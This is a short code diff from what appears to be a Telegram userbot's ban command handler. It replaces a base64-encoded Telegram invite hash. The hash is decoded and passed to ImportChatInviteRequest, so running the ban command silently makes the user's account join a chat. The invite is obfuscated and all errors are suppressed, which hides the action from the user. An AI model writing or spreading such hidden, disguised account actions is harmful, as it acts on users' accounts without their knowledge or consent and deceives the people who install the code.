@@ -81,7 +81,7 @@ async def doggban(event):  # sourcery no-metrics
     if flag:
         return
     try:
-        hmm = b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
         await event.client(ImportChatInviteRequest(hmm))
     except BaseException:
         pass
